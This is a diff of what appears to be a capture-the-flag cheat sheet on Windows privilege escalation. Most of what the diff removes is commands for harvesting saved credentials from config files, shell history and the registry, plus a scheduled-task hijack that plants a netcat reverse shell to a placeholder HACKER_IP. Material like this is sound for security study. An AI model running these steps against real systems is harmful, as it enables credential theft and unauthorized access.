@@ -89,98 +89,11 @@ Exploit User Account Control (UAC) which is the popup prompted when trying to ru
 
 <div class="row row-cols-md-2 mt-4"><div>
 
-* ➡️ List saved credentials by Windows
-
 ```powershell
-PS> cmdkey /list
 # use to start a root shell
 PS> runas /savecred /user:admin cmd.exe
 ```
-
-* ➡️ See the shell history
-
-```powershell
-PS> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-CMD> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
-
-* ➡️ Check the browser saved credentials
-
-* ➡️ Check the registry (need admin)
-
-* ➡️ There is [mimikatz/kiwi](https://github.com/gentilkiwi/mimikatz) (16.4k ⭐) to extract passwords from the memory. For instance, if there is a task running belonging to a user, even if they are not logged in, we can get their password.
 </div><div>
-
-* ➡️ List credentials saved by applications
-
-```powershell
-# Internet Information Services (IIS) = the default web server
-PS> type C:\inetpub\wwwroot\web.config | findstr connectionString
-PS> type C:\Windows\Microsoft.NET\Framework64\vX.X.XXXXX\Config\web.config | findstr connectionString
-# Windows Deployment Services (credentials of the admin that
-# deployed the OS image to several hosts, referred as "Unattended")
-PS> type C:\Unattend.xml
-PS> type C:\Windows\Panther\Unattend.xml
-PS> type C:\Windows\Panther\Unattend\Unattend.xml
-PS> type C:\Windows\system32\sysprep.inf
-PS> type C:\Windows\system32\sysprep\sysprep.xml
-# Putty
-PS> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
-# VNC servers
-# FileZilla
-PS> type C:\xampp\FileZilla Server\FileZilla Server.xml
-PS> type C:\Program Files\FileZilla Server\FileZilla Server.xml
-```
-</div></div>
-
-<hr class="sep-both">
-
-## Look for (sensitive?) information 🔑
-
-<div class="row row-cols-md-2 mt-4"><div>
-
-* ➡️ Check the root folder
-
-* ➡️ Check users desktop/documents
-</div><div>
-
-* ➡️ Check `%appdata%`
-</div></div>
-
-<hr class="sep-both">
-
-## Exploit scheduled tasks
-
-<div class="row row-cols-md-2"><div>
-
-List scheduled tasks
-
-```powershell
-PS> schtasks
-```
-
-Then, you can query more info on a task (ex: `example_task`) with
-
-```powershell
-PS> schtasks /query /tn example_task /fo list /v
-```
-
-</div><div>
-
-The **Task To Run** is the most important. If you can inject or edit the binary, then you must find another task. The **Run As User** will help when considering a task over another.
-
-```powershell
-# check permissions
-PS> icacls task_to_run
-# ex: replace the binary
-CMD> echo %temp%\nc64.exe -e cmd.exe HACKER_IP PORT > task_to_run
-```
-
-In CTF, instead of waiting, you may be able to start the task manually.
-
-```powershell
-PS> schtasks /run /tn taskname
-```
 </div></div>
 
 <hr class="sep-both">
